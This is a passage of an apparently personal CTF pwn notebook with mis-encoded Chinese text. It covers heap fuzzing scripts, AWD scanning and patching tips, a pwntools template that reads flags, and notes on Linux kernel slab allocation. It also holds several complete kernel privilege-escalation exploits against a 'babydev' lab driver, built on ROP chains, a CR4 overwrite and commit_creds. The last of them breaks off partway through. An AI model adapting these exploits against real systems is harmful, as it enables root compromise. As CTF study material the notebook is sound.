            f.write(' delet({},{})\n'.format(a,b))
        else:
            continue
            a = randint(0,8)
            b = randint(0,8)
            c = randint(0,8)
            d = randint(0,8)
            query(a,b,c,d)
            data0=r.recvuntil('Choice Table')
            if 'totally 0 elements' in data0:
                continue
            elif '\x55' in data0:
                f.write(' query({},{},{},{})\n'.format(a,b,c,d))
                break
            elif '\x56' in data0:
                f.write(' query({},{},{},{})\n'.format(a,b,c,d))
                break
    f.close()
```


```python
def fuzz():
    f=open('log.txt','w')
    for i in range(0,0x1000):
        if i % 10 == 0:
           idx=randint(0,0x10)
           add(idx,0x20)
           f.write('add({},0x20)'.format(idx)+'\n')
        elif i % 2 == 0 :
           idx=randint(0,0x10)
           delet(idx)
           f.write('delt({})'.format(idx)+'\n')
        elif i % 3 == 0 :
           idx=randint(0,0x10)
           show(idx)
           r.recvuntil('>>: ')
           check_char=r.recv(1)
           if check_char == '\x55' or check_char == '\x56':
              f.write('show({})'.format(idx)+'\n')
              break            
    f.close()
```


## musl

```bash
sudo cp ./libc.so /lib/ld-musl-x86_64.so.1
```



## AWD&AWDP

æ‰«å­˜æ´»

```shell
nmap -sn 192.168.3.1/24
nmap -sT --min-rate 10000 -p- 192.168.3.122
```

tcpdumpæŠ“å–æµé‡åŒ…

```shell
tcpdump -i lo host 192.168.1.123 and port 9999 -w /tmp/xxx.pcap
```

ç„¶åwiresharkåˆ†æï¼Œé€‰æ‹©åŒ…->åŸå§‹æ•°æ®

```python
payload = '''
'''
payload = payload.split("\n")
print(payload)
for x in payload:
	p.send(unhex(x))
```

### å®¡æŸ¥ç‚¹

scanf+å † == å †æº¢å‡º

UAFï¼Œç¨‹åºåªç½®ç©ºäº†æŒ‡é’ˆè€Œæ²¡æœ‰ç½®ç©º sizeï¼Œæˆ–è€…ç›¸å

### patch

æ”¹eh_frameï¼š

åœ¨.eh_frameæ·»åŠ å‡½æ•°åŠŸèƒ½

é€‰ä¸­ç›®æ ‡æ®µï¼Œå…¨éƒ¨nopï¼Œedit->function->create function

æ›¿æ¢æ‰åŸå§‹æŒ‡ä»¤



å¢åŠ eh_frameæ®µæ‰§è¡Œæƒé™ï¼Œä¿®æ”¹å¼€å¤´eh_frameçš„phtï¼ŒFlagså­—æ®µ

![image-20231017194109359](https://e4l4pic.oss-cn-beijing.aliyuncs.com/image-20231017194109359.png)

UAF   

**1.nop free_plt**

2.uaf_patch

åœ¨eh_frameæ®µå†™è¿™äº›å†…å®¹ï¼ŒåŸfreeå‡½æ•°jumpè¿‡æ¥å³å¯

```
call    _free
mov     qword ptr [202050h], 0
jmp     loc_C0A
```



å¾ªç¯while

åªéœ€è¦æŠŠå˜é‡å˜ä¸ºå¸¸é‡0/1



printf()æ ¼å¼åŒ–å­—ç¬¦ä¸²

ä¿®æ”¹å¯„å­˜å™¨èµ‹å€¼ï¼Œä¸æ”¹åŠ¨printfä»¥åŠeh_frame
rdi<- %s
rsi <- åœ°å€

åŠ %så‚æ•°ã€‚åœ¨`.eh_frame`æ®µä¸­å¡«å…¥%så­—ç¬¦ä¸²ï¼Œå‡è®¾åœ°å€ä¸º0x400c01ï¼Œå°†`mov edi, offset format`ï¼Œä¿®æ”¹ä¸º`mov edi offset 0x400c01, mov rsi offset format`ã€‚



æ•°ç»„è¶Šç•Œ

æ·»åŠ åˆ¤æ–­è¯­å¥

æ¯”å¦‚ï¼Œåœ¨eh_frameæ®µå†™è¿™äº›å†…å®¹ï¼Œjmpè¿‡æ¥

```
.eh_frame:00000000004012C8 83 BD E8 FB FF FF 63          cmp     dword ptr [rbp-418h], 63h ; 'c'
.eh_frame:00000000004012CF 0F 87 25 F9 FF FF             ja      loc_400BFA
.eh_frame:00000000004012CF
.eh_frame:00000000004012D5 83 BD EC FB FF FF 15          cmp     dword ptr [rbp-414h], 15h
.eh_frame:00000000004012DC 0F 87 18 F9 FF FF             ja      loc_400BFA
.eh_frame:00000000004012DC
.eh_frame:00000000004012E2 48 8D 3D 2F FA FF FF          lea     rdi, aPleaseInputWas            ; "PLEASE INPUT wasd TO MOVE YOURSELF!"
.eh_frame:00000000004012E9 E9 0C F6 FF FF                jmp     loc_4008FA
```



å¦‚æœæœ¬æ¥æœ‰æ²™ç›’ï¼Œprctl->nopï¼Œå†è¿›è¡ŒåŠ æ²™ç®±çš„æ“ä½œ



å‘½ä»¤æ‰§è¡Œä¿®å¤ ç ´åå­—ç¬¦ä¸²ï¼Œæ¯”å¦‚flagè¿™æ ·çš„å­—ç¬¦ä¸²

update.sh

```shell
#!/bin/sh
# update.sh
cp pwn /home/ctf/pwn
cp libc.so.6 /lib/x86_64-linux-gnu/libc.so.6
cp ld-xx.so/lib64/ld-linux-x86-64.so.2
chmod 777 /home/ctf/pwn

tar -zcvf 1.tar.gz ./xxx ./update.sh
```



### å‚è€ƒèµ„æ–™

https://ohmygodlin.github.io/ctf/awd/2020/11/20/AWD-pwn%E5%A4%87%E5%BF%98/



```
llvmæ··æ·†0x23aaa 0x28
```





### Fix-tips

- nop free/syscallï¼ˆUserManagerã€tmpfsã€pwn_vvvvmmmmï¼‰
- mmap 7 æ”¹ä¸º 3ï¼ˆoldvmã€cgiï¼‰
- ç¼©å° sizeï¼ˆSafeParseã€mvvmï¼‰



### pwn_waf

```bash
mkdir /tmp/.waf         # åˆ›å»ºä¸€ä¸ªç›®å½•ï¼Œæ³¨æ„è¦å’Œç¼–è¯‘æ—¶çš„é…ç½®æ–‡ä»¶ä¸€è‡´ã€‚
chmod 777 /tmp/.waf     # ä¿®æ”¹å¯¹åº”çš„æƒé™
cp /tmp/hosts.txt /tmp/.waf/hosts.txt  # å°†å¤šç›®æ ‡é˜²æŠ¤çš„å¯¹è±¡æ–‡ä»¶æ”¾åˆ°æ­£ç¡®ä½ç½®

cp /path/pwn /tmp/.waf       # å°†è¦é˜²æŠ¤çš„pwnæ–‡ä»¶ï¼Œå¤åˆ¶åˆ°å¯¹åº”çš„ç›®å½•
cp /tmp/catch /path/pwn      # ç”¨catch æˆ–è€… i0gan ã€ forward æ›¿æ¢åŸå§‹çš„pwnæ–‡ä»¶
chmod 777 /path/pwn
chmod 777 /tmp/.waf/pwn
```

### sandbox

```bash
evilPatcher file [enter]
evilPatcher file /pach/sandboxfile
```

### æäº¤æ¨¡æ¿

```python
# _*_ coding:utf-8 _*_
from pwn import *
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# context.log_level = "debug"
context.arch = "amd64"

context.terminal = ['tmux', 'splitw', '-h']

ip = server_ip = sys.argv[1].split(':')[0]
port = server_port = int(sys.argv[1].split(':')[1])

p = remote(ip, port)
# p = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def dbg():
    gdb.attach(p)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def cat_flag():
    flag_header = 'flag{'
    sleep(1)
    sl('cat flag')
    ru(flag_header)
    flag = flag_header + ru('}') + '}'
    write_to_flags(flag + '\n')
    write_to_logs('\nexploited: ' + server_ip.encode() + ':' + str(server_port).encode() + flag)
    exit(0)

def write_to_flags(d):
    fd = open('./flags', 'ab')
    fd.write(d + '\n')
    fd.close()
    
ia()
cat_flag()
```



## Kernel

### è°ƒè¯•æ³¨æ„

```c
printf("\033[32m\033[1m[+] Getting the root......\033[0m\n");
```

è°ƒè¯•å†…æ ¸æ¨¡å—bssæ®µæ—¶ï¼Œè¦æ³¨æ„å®é™…åœ°å€è·ŸIDAåˆ†æå‡ºæ¥çš„åœ°å€ä¸ä¸€æ ·ã€‚

è§£æ‰“åŒ…cpioå‘½ä»¤

```shell
# å¿«é€Ÿæ‰“åŒ…æµ‹è¯•EXP
ktest ./rootfs.cpio ./exp

# è§£åŒ…
excpio ./rootfs.cpio

# æ‰“åŒ…
cd rootfs
packcpio .
```

gdbè°ƒè¯•
```shell
qemu -s

gdb
pwndbg> file ./vmlinux
pwndbg> target remote :1234
pwndbg> add-symbol-file ./xxx.ko 0xffffffffa0000000 ç¨‹åºåŸºåœ°å€ï¼ˆlsmodï¼‰
# babydriver 16384 0 - Live 0xffffffffc0000000 (OE)
pwndbg> b start_kernel
pwndbg> c
```

å †ä¿¡æ¯
```
gefâ¤  p &kmalloc_caches
$1 = (struct kmem_cache *(*)[14]) 0xffffffff81e21700 <kmalloc_caches>
gefâ¤  x/20gx 0xFFFFFFFF81E21700
<kmalloc_caches>:	0x0000000000000000	0xffff880002c01a00(0x60)
<kmalloc_caches+16>:	0xffff880002c01800(0xc0)	0xffff880002c01e00(0x8)
<kmalloc_caches+32>:	0xffff880002c01d00(0x10)	0xffff880002c01c00(0x20)
<kmalloc_caches+48>:	0xffff880002c01b00(0x40)	0xffff880002c01900(0x80)
<kmalloc_caches+64>:	0xffff880002c01700(0x100)	0xffff880002c01600(0x200)
<kmalloc_caches+80>:	0xffff880002c01500(0x400)	0xffff880002c01400(0x800)
<kmalloc_caches+96>:	0xffff880002c01300(0x1000)	0xffff880002c01200(0x2000)
0xffffffff81e21770 <kmem_cache>:	0xffff880002c01000	0x0000000000000004
0xffffffff81e21780 <sysctl_compact_memory>:	0x0000000000000000	0xffff8800026e6000
0xffffffff81e21790 <high_memory>:	0xffff880003fe0000	0x0000000000000000


gefâ¤  p (struct kmem_cache)*0xffff880002c01500

```

 æ‰¾gadget

```shell
ROPgadget --binary ./vmlinux > ropgadget.txt
```

å°†bzImageè½¬åŒ–æˆvmlinux

```shell
/usr/src/linux-headers-$(uname -r)/scripts/extract-vmlinux bzImage > vmlinux

$ file vmlinux 
vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=76517ec1ebecb36ffb324a8b5b0495c51625c53b, stripped
$ file bzImage 
bzImage: Linux kernel x86 boot executable bzImage, version 4.15.8 (root@ubuntu) #3 SMP Thu Jun 3 01:01:56 PDT 2021, RO-rootFS, swap_dev 0x7, Normal VGA
```

slab_freelist_hardenedç¡®è®¤
```shell
vmlinux-to-elf bzImage vmlinux.elf
åœ¨vmlinux.elfæœç´¢kmallocå‡½æ•°ï¼Œçœ‹prefetcht0æŒ‡ä»¤ä¸´è¿‘çš„å‰å‡ æ¡æŒ‡ä»¤æ²¡æœ‰xoræŒ‡ä»¤ï¼Œæ²¡æœ‰åˆ™æ²¡æœ‰å¼€å¯
```


### å†…æ ¸å †ç®¡ç†

#### èŠ‚ç‚¹ åŒº é¡µçš„æ¦‚å¿µ

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240105150511.png)

MCå°±æ˜¯ä¸€ä¸ªèŠ‚ç‚¹çš„è¾¹æ ‡å¿—ï¼Œå¯¹åº”äº†CPUç»„å’Œä¸€æ®µå†…å­˜ï¼Œæ¯ä¸ªèŠ‚ç‚¹é—´ç‹¬ç«‹å·¥ä½œ
åœ¨è¿™æ®µå†…å­˜ä¸Šä¼šè¿›ä¸€æ­¥åˆ’åˆ†ä¸ºä¸åŒçš„åŒºå¦‚ ZONE_DMAã€ZONE_NORMAL ç­‰
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240105150642.png)
è€Œæ¯ä¸ªåŒºå‘¢å°±åƒä¸‹å›¾æ‰€ç¤ºï¼Œæ¯ä¸ªåŒºéƒ½æœ‰è‡ªå·±çš„ä¼™ä¼´ç³»ç»Ÿ
#### buddy system
ä¼™ä¼´å—ï¼Œå¤§å°ç›¸ç­‰ï¼Œåœ°å€ç›¸é‚»ï¼Œéƒ½ç©ºé—²æ—¶ä¼šåˆå¹¶æˆæ›´å¤§å—

å…¶å­˜åœ¨äº åŒº è¿™ä¸€çº§åˆ«ï¼Œç®¡ç†åŒº

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240105113714.png)

æŒ‰ç…§ç©ºé—²é¡µé¢çš„è¿ç»­å¤§å°è¿›è¡Œåˆ†é˜¶ç®¡ç†ï¼Œè¿™é‡Œçš„ order çš„å®é™…å«ä¹‰ä¸ºè¿ç»­çš„ç©ºé—²é¡µé¢çš„å¤§å°ï¼Œä¸è¿‡å•ä½ä¸æ˜¯é¡µé¢æ•°ï¼Œè€Œæ˜¯é˜¶ï¼Œå³å¯¹äºæ¯ä¸ªä¸‹æ ‡è€Œè¨€ï¼Œå…¶ä¸­æ‰€å­˜å‚¨çš„é¡µé¢å¤§å°ä¸ºï¼š2^order

åˆ†é…ï¼š
è¯·æ±‚å†…å­˜å‘2çš„æ¬¡æ–¹è¿›è¡Œå¯¹é½ï¼Œç„¶åé€‰æ‹©å¯¹åº”çš„free_areaã€‚å–ä¸åˆ°å°±ä»ä¸‹ä¸€ä¸ª order ä¸­å–å‡ºå†…å­˜é¡µï¼Œä¸€åˆ†ä¸ºäºŒï¼Œè£…è½½åˆ°å½“å‰ä¸‹æ ‡å¯¹åº”é“¾è¡¨ä¸­ã€‚
é‡Šæ”¾ï¼š
é‡Šæ”¾åˆ°å¯¹åº”çš„free_arenaä¸­ï¼Œæ£€æŸ¥ä¼™ä¼´å—çŠ¶æ€å¦‚æœä¹Ÿæ˜¯freeçš„ï¼Œé‚£å°±åˆå¹¶è¿›å…¥ä¸‹ä¸€ä¸ªorder

#### slab allocator
ä¸‰ä¸ªç‰ˆæœ¬
slab -> slob -> slub

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240105115134.png)
kmem_cache ä¸ºä¸€ä¸ªå…¨å±€çš„åŸºæœ¬çš„ allocator ç»„ä»¶ï¼Œç”¨äºåˆ†é…Objï¼Œæ¯ä¸ª kmem_cache ä»£è¡¨ä¸€ç§ç‰¹å®šå¤§å°å’Œç±»å‹çš„å†…å­˜ç¼“å­˜ï¼Œç”¨äºç®¡ç†ç‰¹å®šç±»å‹çš„å¯¹è±¡åˆ†é…ã€‚
æ¯ä¸ªç”¨äºæ ‡è®°ä¸åŒå¤§å°çš„kmem_cacheå­˜åœ¨äºä¸¤ä¸ªç»“æ„ä½“kmalloc_cashes(é€šè¿‡CPU)å’Œkmalloc_dma_caches(ä¸é€šè¿‡CPU)ä¸­ï¼Œè¿™é‡Œä¸»è¦çœ‹kmalloc_cashes


kmem_cacheä¸»è¦ç”±2ä¸ªå¤§æ¨¡å—ï¼Œkmem_cache_cpuå’Œkmem_cache_nodeç»„æˆ
kmem_cache_cpu(æŒ‰æ ¸å¿ƒ)æ˜¯ä¸€ä¸ª percpu å˜é‡(æ¯ä¸ªæ ¸å¿ƒä¸Šæœ‰ä¸€ä¸ª)ï¼ŒPer-CPU å˜é‡æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ•°æ®ç»“æ„ï¼Œå®ƒä¸ºç³»ç»Ÿä¸­çš„æ¯ä¸ª CPU æ ¸å¿ƒæä¾›äº†ä¸€ä¸ªç‹¬ç«‹çš„å˜é‡å‰¯æœ¬ï¼Œå³é’ˆå¯¹äºå½“å‰CPUæ ¸å¿ƒ
ä¸»è¦ç”¨ä»¥è¡¨ç¤ºå½“å‰æ ¸å¿ƒæ­£åœ¨ä½¿ç”¨çš„ slubï¼Œå½“å‰ CPU ä¼šä¼˜å…ˆä» kmem_cache_cpu ä¸Šå– object

kmem_cache_node(æŒ‰èŠ‚ç‚¹)ï¼Œæ¯ä¸ª NUMA èŠ‚ç‚¹éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„ kmem_cache_node å®ä¾‹ï¼Œåˆ†åˆ«ç®¡ç†å„è‡ªèŠ‚ç‚¹çš„å†…å­˜åˆ†é…æƒ…å†µ
å…¶ä¸­ä¸»è¦æœ‰2ä¸ªé“¾è¡¨ï¼Œåˆ†åˆ«æ˜¯partialå’Œfull
partialï¼šslubé“¾è¡¨ï¼Œslub ä¸Šå­˜åœ¨ç€ä¸€å®šæ•°é‡çš„ç©ºé—² objectï¼Œä½†å¹¶éå…¨éƒ¨ç©ºé—²ã€‚
fullï¼šslubé“¾è¡¨ï¼Œè¯¥ slub ä¸Šçš„æ‰€æœ‰ object éƒ½è¢«åˆ†é…å‡ºå»äº†ã€‚

åˆ†é…
é¦–å…ˆä» kmem_cache_cpu ä¸Šå–å¯¹è±¡ï¼Œè‹¥æœ‰åˆ™ç›´æ¥è¿”å›ã€‚
è‹¥ kmem_cache_cpu ä¸Šçš„ slub å·²ç»æ— ç©ºé—²å¯¹è±¡äº†ï¼Œå¯¹åº” slub ä¼šè¢«ä» kmem_cache_cpu ä¸Šå–ä¸‹ï¼Œå¹¶å°è¯•ä» partial é“¾è¡¨ä¸Šå–ä¸€ä¸ª slub æŒ‚è½½åˆ° kmem_cache_cpu ä¸Šï¼Œç„¶åå†å–å‡ºç©ºé—²å¯¹è±¡è¿”å›ã€‚
è‹¥ kmem_cache_node çš„ partial é“¾è¡¨ä¹Ÿç©ºäº†ï¼Œé‚£å°±å‘ buddy system è¯·æ±‚åˆ†é…æ–°çš„å†…å­˜é¡µï¼Œåˆ’åˆ†ä¸ºå¤šä¸ª object ä¹‹åå†ç»™åˆ° kmem_cache_cpuï¼Œå–ç©ºé—²å¯¹è±¡è¿”å›ä¸Šå±‚è°ƒç”¨
(\*è°ƒç”¨å†…å­˜åˆ†é…å‡½æ•°æ—¶æä¾›çš„æ ‡å¿—ï¼ˆå¦‚ GFP_KERNEL, GFP_ATOMIC ç­‰ï¼‰ä¼šå†³å®šä»å“ªä¸ªbuddy systemé‡Œå–å†…å­˜é¡µ)
é‡Šæ”¾ï¼š
è‹¥è¢«é‡Šæ”¾ object å±äº kmem_cache_cpu çš„ slubï¼Œç›´æ¥ä½¿ç”¨å¤´æ’æ³•æ’å…¥å½“å‰ CPU slub çš„ freelistã€‚
è‹¥è¢«é‡Šæ”¾ object å±äº kmem_cache_node çš„ partial é“¾è¡¨ä¸Šçš„ slubï¼Œç›´æ¥ä½¿ç”¨å¤´æ’æ³•æ’å…¥å¯¹åº” slub çš„ freelistã€‚
è‹¥è¢«é‡Šæ”¾ object ä¸º full slubï¼Œåˆ™å…¶ä¼šæˆä¸ºå¯¹åº” slub çš„ freelist å¤´èŠ‚ç‚¹ï¼Œä¸”è¯¥ slub ä¼šè¢«æ”¾ç½®åˆ° partial é“¾è¡¨ã€‚


### ç»“æ„ä½“æ€»ç»“

https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x0A-%E5%86%85%E6%A0%B8%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D

| ç»“æ„ä½“/èƒ½åŠ› | æ§åˆ¶æµåŠ«æŒ | æ³„éœ²å † | æ³„éœ²æ ˆ | æ³„éœ²å†…æ ¸åœ°å€ | ç»“æ„ä½“å¤§å° |
| ---- | ---- | ---- | ---- | ---- | ---- |
| cred | x | âˆš | x | x | 0xa8 (kmalloc-192) |
| tty_struct | âˆš | âˆš | x | âˆš | 0x2e0 (kmalloc-1024) |
| seq_operations | âˆš | x | x | âˆš | 0x20 (kmalloc-32) |
| subprocess_info | âˆš | âˆš | x | âˆš | 0x60 (kmalloc-128) |
| pipe_buffer | âˆš | x | x | âˆš | 0x280 (kmalloc-1024) |
| shm_file_data | x | âˆš | x | âˆš | 0x20 (kmalloc-32) |
| msg_msg | x | âˆš | x | x | 0x31~0x1000 (>= kmalloc-64) |
| timerfd_ctx | x | âˆš | x | âˆš | 0xf0 (kmalloc-256) |
#### cred

#### tty_struct

#### seq_operations


```c
// exp.c
// gcc exp.c -static -masm=intel  -o exp
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include<errno.h>

int fd_stat;
__uint64_t temp_buf[4];
__uint64_t pop_rax_ret = 0xffffffff8101c216;               // pop rax ; ret
__uint64_t mov_rsp_rax_ret = 0xffffffff818855cf;           // mov rsp, rax ; dec ebx ; jmp 0xffffffff8188558b ï¼ˆretï¼‰
__uint64_t mov_cr4_rax_ret = 0xffffffff8100f034;        // mov cr4,rax; pop rbp; ret
__uint64_t swapgs_ret = 0xffffffff81885588;             // swapgs; ret
__uint64_t iretq = 0xffffffff81884177;                  // iretq

__uint64_t fake_stack[20];
__uint64_t fake_stack_addr = &fake_stack;

size_t pkc_addr = 0xffffffff81070260;
size_t cc_addr = 0xffffffff8106fed0;
void get_root(){
    char* (*pkc)(int) = pkc_addr;
    void (*cc)(char*) = cc_addr;
    (*cc)((*pkc)(0));
}

void get_shell(){
    system("/bin/sh");
}

size_t user_cs, user_rflags, user_sp, user_ss;
void save_status(){
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}



__uint64_t gadget1 = 0xffffffff815f5951;// add rsp,0x108; pop rbx; pop r12; pop r13; pop r14; pop r15; pop rbp; ret

int main(){
    save_status();
    printf("fake_stack_addr: 0x%llx\n",fake_stack_addr);

    int fd1 = open("/dev/babydev",2);
    int fd2 = open("/dev/babydev",2);

    ioctl(fd1,0x10001,0x20);
    close(fd1);

    fd_stat = open("/proc/self/stat",0);
    write(fd2,&gadget1,8);

    fake_stack[0] = pop_rax_ret;
    fake_stack[1] = 0x6f0;
    fake_stack[2] = mov_cr4_rax_ret;
    fake_stack[3] = 0xffff;         // rbp, padding
    fake_stack[4] = get_root;
    fake_stack[5] = swapgs_ret;
    fake_stack[6] = iretq;
    fake_stack[7] = get_shell;
    fake_stack[8] = user_cs;
    fake_stack[9] = user_rflags;
    fake_stack[10] = user_sp;
    fake_stack[11] =  user_ss;

    __asm__(
    "mov r15, 0x15151515;"
    "mov r14, 0x14141414;"      // 4
    "mov r13, mov_rsp_rax_ret;"      // 3
    "mov r12, fake_stack_addr;"      // 2
    "mov r11, 0x11111111;"
    "mov r10, 0x10101010;"      // r10
    "mov rbp, 0xbbbbbbbb;"      // 5
    "mov rbx, pop_rax_ret;"      // 1
    "mov r9, 0x99999999;"       // r9
    "mov r8, 0x88888888;"       //r8
    "mov rcx, 0xcccccccc;"
    "xor rax, rax;"
    "mov rdx, 0x20;"
    "mov rsi, temp_buf;"
    "mov rdi, fd_stat;"
    "syscall"
    );
    close(fd_stat);
	close(fd2);
    return 0;
}
```

```c
    //int64_t seq_read_buf[4];
    __asm__(
        "mov r15, 0x15151515;"      // 
        "mov r14, 0x14141414;"      // 1
        "mov r13, 0x13131313;"      // 2
        "mov r12, 0x12121212;"      // 3
        "mov r11, 0x11111111;"      // 
        "mov r10, 0x10101010;"      // 7
        "mov rbp, 0xaaaaaaaa;"      // 4
        "mov rbx, 0xbbbbbbbb;"      // 5
        "mov r9, 0x99999999;"       // 8
        "mov r8, 0x88888888;"       // 9
        "mov rcx, 0xcccccccc;"
        "xor rax, rax;"             // 6
        "mov rdx, 0x20;"            //
        "mov rsi, seq_read_buf;"
        "mov rdi, seq_fd;"          // read(seq_fd,seq_read_buf,0x20)
        "syscall"
    );
```

#### subprocess_info


```c
// exp.c
// gcc exp.c -static -masm=intel  -o exp -lpthread
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<errno.h>
#include<sys/socket.h>
#include<pthread.h>
#include<sys/ioctl.h>
#include<sys/mman.h>


int race_flag = 0;
static int fd1 = 0;
static int fd2 = 0;
__uint64_t target_buf[2];

__uint64_t xchg_esp_eax_ret = 0xffffffff8100008a;           // xchg esp, eax ; ret
__uint64_t pop_rax_ret = 0xffffffff8101c216;               // pop rax ; ret
__uint64_t mov_rsp_rax_ret = 0xffffffff818855cf;           // mov rsp, rax ; dec ebx ; jmp 0xffffffff8188558b
__uint64_t mov_cr4_rax_ret = 0xffffffff8100f034;        // mov cr4,rax; pop rbp; ret
__uint64_t swapgs_ret = 0xffffffff81885588;             // swapgs; ret
__uint64_t iretq = 0xffffffff81884177;                  // iretq


__uint64_t commit_creds = 0xffffffff8106fed0;
__uint64_t prepare_kernel_cred = 0xffffffff81070260;
__uint64_t init_cred_addr = 0xffffffff81b79a60;

void get_root(){
    //char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    //(*cc)((*pkc)(0));
    (*cc)(init_cred_addr);
}

void get_shell(){
    system("/bin/sh");
}

size_t user_cs, user_rflags, user_sp, user_ss;
void save_status(){
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}


void race()
{
    target_buf[0] = xchg_esp_eax_ret;
    target_buf[1] = 0x11111111;
    __uint64_t fake_stack_addr = ((__uint64_t)xchg_esp_eax_ret & 0xffffffff);
    if(mmap((char*)(fake_stack_addr&(~0xfff)),0x2000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0) == MAP_FAILED){
        perror("mmap failed.");
    }
    __uint64_t* fake_stack_ptr = (__uint64_t*)fake_stack_addr;
    int index = 0;
    fake_stack_ptr[index++] = pop_rax_ret;
    fake_stack_ptr[index++] = 0x6f0;
    fake_stack_ptr[index++] = mov_cr4_rax_ret;
    fake_stack_ptr[index++] = 0xffff; 
    fake_stack_ptr[index++] = get_root;
    fake_stack_ptr[index++] = swapgs_ret;
    fake_stack_ptr[index++] = iretq;
    fake_stack_ptr[index++] = get_shell;
    fake_stack_ptr[index++] = user_cs;
    fake_stack_ptr[index++] = user_rflags;
    fake_stack_ptr[index++] = user_sp;
    fake_stack_ptr[index++] = user_ss;

    while(1)
    {
        write(fd2,target_buf,0x60+0x50);
        if(race_flag)
        {
            printf("child: detect race happen\n");
            break;
        }
    }
}


int main(){
    save_status();

    int fd1 = open("/dev/babydev",2);
    int fd2 = open("/dev/babydev",2);

    ioctl(fd1,0x10001,0x20);
    close(fd1);
    pthread_t th1;
    pthread_create(&th1,NULL,race,NULL);
    while(1){
        usleep(1);
        socket(22,AF_INET,0);                
        if(race_flag){
            printf("parent: detect race happen\n");
            break;
        }
    }
    close(fd2);

    return 0;
}
```



#### pipe_buffer


```c
// exp.c
// gcc exp.c -static -masm=intel  -o exp 
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<errno.h>
#include<sys/socket.h>
#include<pthread.h>
#include<sys/ioctl.h>
#include<sys/mman.h>


size_t fake_pipe_ops[5];
size_t fake_pipe_buffer[5];

__uint64_t xchg_esp_eax_ret = 0xffffffff8100008a;           // xchg esp, eax ; ret
__uint64_t pop_rax_ret = 0xffffffff8101c216;               // pop rax ; ret
__uint64_t mov_rsp_rax_ret = 0xffffffff818855cf;           // mov rsp, rax ; dec ebx ; jmp 0xffffffff8188558b
__uint64_t mov_cr4_rax_ret = 0xffffffff8100f034;        // mov cr4,rax; pop rbp; ret
__uint64_t swapgs_ret = 0xffffffff81885588;             // swapgs; ret
__uint64_t iretq = 0xffffffff81884177;                  // iretq

__uint64_t pop_rsp_ret = 0xffffffff81010fd7;     // pop rsp ; ret


__uint64_t commit_creds = 0xffffffff8106fed0;
__uint64_t prepare_kernel_cred = 0xffffffff81070260;
__uint64_t init_cred_addr = 0xffffffff81b79a60;

void get_root(){
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
    // (*cc)(init_cred_addr);
}

void get_shell(){
    system("/bin/sh");
}

size_t user_cs, user_rflags, user_sp, user_ss;
void save_status(){
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}


int main(){
    save_status();
    size_t rop_chain[30] = {0};
    int index = 0;
    rop_chain[index++] = 0xffffffff8101c216;        // pop rax; ret;
    rop_chain[index++] = 0x6f0;
    rop_chain[index++] = 0xffffffff8100f034;        // mov cr4,rax; pop rbp; ret 
    rop_chain[index++] = 0x0;
    rop_chain[index++] = (size_t)get_root;
    rop_chain[index++] = 0xffffffff81885588;        // swapgs; ret 
    rop_chain[index++] = 0xffffffff81884177;        // iretq; 
    rop_chain[index++] = (size_t)get_shell;
    rop_chain[index++] = user_cs;
    rop_chain[index++] = user_rflags;
    rop_chain[index++] = user_sp;
    rop_chain[index++] = user_ss;


    fake_pipe_buffer[0] = 0x01010101;
    fake_pipe_buffer[1] = 0x02020202;
    fake_pipe_buffer[2] = fake_pipe_ops;
    fake_pipe_buffer[3] = 0x03030303;

    fake_pipe_ops[0] = pop_rsp_ret;          // pop rsp; ret
    fake_pipe_ops[1] = rop_chain;          // rop_chain
    fake_pipe_ops[2] = mov_rsp_rax_ret;          // control rip - xchg rsp,rax; ret
    fake_pipe_ops[3] = 0x33333333;
    fake_pipe_ops[4] = 0x44444444;




    int fd1 = open("/dev/babydev",2);
    int fd2 = open("/dev/babydev",2);

